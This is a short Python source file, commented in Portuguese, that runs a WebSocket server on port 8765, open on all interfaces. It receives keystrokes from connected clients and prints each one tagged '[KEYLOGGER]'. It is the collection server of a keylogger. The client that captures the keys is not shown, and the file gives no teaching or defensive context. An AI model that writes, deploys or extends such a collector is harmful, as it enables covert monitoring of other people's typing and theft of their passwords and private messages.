import asyncio
import websockets

# Lista de clientes conectados
clientes = set()

async def handler(websocket):
    global clientes
    clientes.add(websocket)
    try:
        async for message in websocket:
            print(f"[KEYLOGGER] {message}")  # Exibe a tecla recebida
    except:
        pass
    finally:
        clientes.remove(websocket)

async def main():
    server = await websockets.serve(handler, "0.0.0.0", 8765)
    print("Servidor WebSocket rodando na porta 8765...")
    await server.wait_closed()

# Inicia o servidor
asyncio.run(main())
